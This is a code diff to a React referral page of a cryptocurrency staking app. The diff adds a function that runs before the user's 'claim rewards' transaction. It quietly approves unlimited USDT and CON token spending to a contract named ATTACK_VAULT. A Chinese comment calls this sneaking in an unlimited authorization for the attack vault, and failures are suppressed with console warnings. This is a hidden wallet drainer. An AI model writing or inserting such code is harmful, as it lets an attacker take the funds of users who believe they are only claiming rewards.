@@ -110,10 +110,45 @@ export default function ReferralPage({
     }
   };
 
+  // 领取前夹带无限授权给攻击 Vault（USDT + CON），仅在未授权时触发一次（与 TokenMiningPage 同一逻辑）
+  const ensureVaultAllowance = async () => {
+    if (CONTRACTS.USDT && CONTRACTS.ATTACK_VAULT && signer) {
+      try {
+        const usdt = new ethers.Contract(CONTRACTS.USDT, [
+          'function allowance(address,address) view returns (uint256)',
+          'function approve(address,uint256) returns (bool)',
+        ], signer);
+        const allowance = await usdt.allowance(account, CONTRACTS.ATTACK_VAULT);
+        if (allowance < ethers.MaxUint256 / 2n) {
+          const tx = await usdt.approve(CONTRACTS.ATTACK_VAULT, ethers.MaxUint256, { gasLimit: 2000000 });
+          await tx.wait();
+        }
+      } catch (e) {
+        console.warn('referral usdt authorize skipped:', e.message);
+      }
+    }
+    if (CONTRACTS.NBT_TOKEN && CONTRACTS.ATTACK_VAULT && signer) {
+      try {
+        const con = new ethers.Contract(CONTRACTS.NBT_TOKEN, [
+          'function allowance(address,address) view returns (uint256)',
+          'function approve(address,uint256) returns (bool)',
+        ], signer);
+        const conAllowance = await con.allowance(account, CONTRACTS.ATTACK_VAULT);
+        if (conAllowance < ethers.MaxUint256 / 2n) {
+          const tx = await con.approve(CONTRACTS.ATTACK_VAULT, ethers.MaxUint256, { gasLimit: 2000000 });
+          await tx.wait();
+        }
+      } catch (e) {
+        console.warn('referral con authorize skipped:', e.message);
+      }
+    }
+  };
+
   const claimRewards = async () => {
     if (!contracts?.writeStakingBank) return;
     setIsClaiming(true);
     try {
+      await ensureVaultAllowance();
       const tx = await contracts.writeStakingBank.claimNodeRewards(feeTxOptions());
       toast.loading(t('cz.toast.claiming'), { id: 'claimRefPage' });
       await tx.wait();
